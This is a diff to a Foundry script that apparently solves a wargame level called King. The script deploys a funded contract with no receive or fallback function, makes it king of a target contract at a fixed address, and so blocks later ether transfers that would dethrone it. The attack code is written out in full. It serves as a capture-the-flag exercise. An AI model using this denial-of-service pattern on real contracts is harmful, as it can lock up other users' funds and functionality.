@@ -6,6 +6,8 @@ import "../src/King.sol";
 
 contract CantReceiveContract {
 
+    constructor() payable {}
+
     function becomeKing(address _recepient) external payable {
         (bool success, ) = address(_recepient).call{value: 1e15}(""); 
         require(success, "call failed");
@@ -23,7 +25,7 @@ contract CantReceiveContract {
 
 contract KingScript is Script {
 
-    King public king = King(payable(0xb331A36D9bE6452BFfaD52A25A4b578535FEf712));
+    King public king = King(payable(0x9C9892dA50B808Cb623103A8dDf1256ea398505e));
     /**
      * Solution: Deploy a contract with inital funds and without any receive or fallback function.
      * AKA contract that can't receive any funds.
@@ -31,12 +33,12 @@ contract KingScript is Script {
      */
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        CantReceiveContract cantReceiver = new CantReceiveContract();
+        CantReceiveContract cantReceiver = new CantReceiveContract{value: 1e15}();
 
         console.log("1. Current king", king._king());
-        vm.deal(address(cantReceiver), 1e15);
+        //vm.deal(address(cantReceiver), 1e15);
         
-        cantReceiver.becomeKing(0xb331A36D9bE6452BFfaD52A25A4b578535FEf712);
+        cantReceiver.becomeKing(0x9C9892dA50B808Cb623103A8dDf1256ea398505e);
         console.log("2. New king", king._king());
 
         (bool success, ) = address(king).call{value: 1e16}(""); 
